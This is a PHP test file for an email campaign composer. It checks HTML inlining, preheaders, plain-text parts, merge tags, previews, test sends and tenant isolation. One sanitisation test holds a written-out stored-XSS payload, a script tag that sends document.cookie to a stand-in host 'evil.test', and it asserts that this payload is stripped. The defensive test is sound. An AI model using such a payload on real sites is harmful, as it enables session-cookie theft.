<?php

use App\Models\Campaign;
use App\Models\Contact;
use App\Models\SmtpAccount;
use App\Models\User;
use Illuminate\Support\Facades\Mail;

/**
 * The composer used to hand Quill's raw output straight to the send pipeline.
 * Quill styles with classes and ships no stylesheet, so every campaign arrived
 * unstyled; nothing was sanitised, so the WYSIWYG was a stored-XSS vector; and
 * there was no preheader, no merge-tag inserter and no test send.
 */
beforeEach(function (): void {
    $this->user = actingAsTenantUser();
});

it('stores the raw editor output and a rendered email-safe version separately', function (): void {
    $this->post(route('campaigns.store'), [
        'name' => 'Launch',
        'subject' => 'Hello [Name]',
        'preheader' => 'Your July update is here',
        'editor_html' => '<p class="ql-align-center">Centred copy</p>',
    ])->assertRedirect(route('campaigns.index'))->assertSessionHasNoErrors();

    $campaign = Campaign::sole();

    // Raw output is kept so the campaign can be reopened for editing…
    expect($campaign->editor_html)->toContain('ql-align-center')
        // …while what ships is inlined and table-wrapped.
        ->and($campaign->body_html)->toContain('text-align: center')
        ->and($campaign->body_html)->toContain('role="presentation"')
        ->and($campaign->body_html)->not->toContain('ql-align-center');
});

it('strips script payloads out of campaign html on save', function (): void {
    $this->post(route('campaigns.store'), [
        'name' => 'Nasty',
        'subject' => 'Hi',
        'editor_html' => '<p onclick="steal()">Hi</p><script>fetch("//evil.test?c="+document.cookie)</script>',
    ])->assertRedirect()->assertSessionHasNoErrors();

    $campaign = Campaign::sole();

    expect($campaign->body_html)->not->toContain('<script')
        ->not->toContain('onclick')
        ->not->toContain('evil.test')
        ->toContain('Hi');
});

it('embeds the preheader so inboxes stop scraping the body', function (): void {
    $this->post(route('campaigns.store'), [
        'name' => 'Preheader',
        'subject' => 'Hi',
        'preheader' => 'Twenty percent off everything',
        'editor_html' => '<p>Body</p>',
    ])->assertSessionHasNoErrors();

    expect(Campaign::sole()->body_html)
        ->toContain('Twenty percent off everything')
        ->toContain('mso-hide: all');
});

it('derives a plain-text part when the operator leaves it empty', function (): void {
    $this->post(route('campaigns.store'), [
        'name' => 'Auto text',
        'subject' => 'Hi',
        'editor_html' => '<h1>Sale</h1><p>Up to <strong>50%</strong> off</p>',
    ])->assertSessionHasNoErrors();

    // A missing text/plain part is a well-known spam signal.
    expect(Campaign::sole()->body_text)->toContain('Sale')->toContain('Up to 50% off');
});

it('keeps a hand-written plain-text part', function (): void {
    $this->post(route('campaigns.store'), [
        'name' => 'Manual text',
        'subject' => 'Hi',
        'editor_html' => '<p>Rich</p>',
        'body_text' => 'My own wording',
    ])->assertSessionHasNoErrors();

    expect(Campaign::sole()->body_text)->toBe('My own wording');
});

it('preserves merge tags through rendering', function (): void {
    $this->post(route('campaigns.store'), [
        'name' => 'Personalised',
        'subject' => 'Hi [Name]',
        'editor_html' => '<p>Hello [Name], <a href="[ProfileUrl]">your profile</a></p>',
    ])->assertSessionHasNoErrors();

    // DOMDocument percent-encodes brackets in href; if that leaked through,
    // every personalised link in every campaign would break.
    expect(Campaign::sole()->body_html)
        ->toContain('Hello [Name]')
        ->toContain('href="[ProfileUrl]"')
        ->not->toContain('%5B');
});

it('renders the preview through the same pipeline that sends', function (): void {
    $this->postJson(route('campaigns.preview'), [
        'editor_html' => '<p class="ql-align-right">Right</p>',
        'subject' => '{Hi|Hello} [Name]',
        'preheader' => 'Preview line',
    ])->assertOk()
        ->assertJsonPath('data.preheader', 'Preview line')
        ->assertJsonStructure(['data' => ['subject', 'preheader', 'html', 'text']]);

    $html = $this->postJson(route('campaigns.preview'), [
        'editor_html' => '<p class="ql-align-right">Right</p>',
    ])->json('data.html');

    expect($html)->toContain('text-align: right');
});

it('resolves merge tags in the preview so the operator sees real copy', function (): void {
    Contact::factory()->create([
        'tenant_id' => $this->user->tenant_id,
        'first_name' => 'Ada',
        'email' => 'ada@example.com',
    ]);

    $this->postJson(route('campaigns.preview'), [
        'editor_html' => '<p>Hi [Name]</p>',
        'subject' => 'Hello [Name]',
    ])->assertOk()
        ->assertJsonPath('data.subject', 'Hello Ada')
        ->assertJsonFragment(['html' => '<p style="margin: 0 0 16px 0; line-height: 1.6;">Hi Ada</p>']);
});

it('sends a test email through a real relay', function (): void {
    Mail::fake();

    $relay = SmtpAccount::factory()->create(['tenant_id' => $this->user->tenant_id]);
    $campaign = Campaign::factory()->create([
        'tenant_id' => $this->user->tenant_id,
        'subject' => 'Launch',
        'editor_html' => '<p>Hello</p>',
    ]);
    $campaign->smtpAccounts()->attach($relay->id);

    $this->from(route('campaigns.edit', $campaign))
        ->post(route('campaigns.test-send', $campaign), ['test_email' => 'me@example.com'])
        ->assertRedirect()
        ->assertSessionHas('success');

    Mail::assertSent(App\Mail\CampaignEmail::class, function ($mail) {
        return $mail->hasTo('me@example.com') && str_starts_with($mail->campaignSubject, '[TEST]');
    });
});

it('refuses a test send with no relay configured', function (): void {
    $campaign = Campaign::factory()->create(['tenant_id' => $this->user->tenant_id]);

    $this->from(route('campaigns.edit', $campaign))
        ->post(route('campaigns.test-send', $campaign), ['test_email' => 'me@example.com'])
        ->assertRedirect()
        ->assertSessionHasErrors();
});

it('will not test-send another workspace campaign', function (): void {
    $victim = User::factory()->create();
    $foreign = Campaign::factory()->create(['tenant_id' => $victim->tenant_id]);

    $this->post(route('campaigns.test-send', $foreign), ['test_email' => 'me@example.com'])
        ->assertNotFound();
});

it('rejects an invalid reply-to address', function (): void {
    $this->post(route('campaigns.store'), [
        'name' => 'Bad reply to',
        'subject' => 'Hi',
        'reply_to' => 'not-an-email',
    ])->assertSessionHasErrors('reply_to');
});

it('offers only merge tags the renderer resolves', function (): void {
    $html = $this->get(route('campaigns.create'))->assertOk()->getContent();

    foreach (App\Support\MergeTags::available() as $tag) {
        expect($html)->toContain($tag['label']);
    }
});
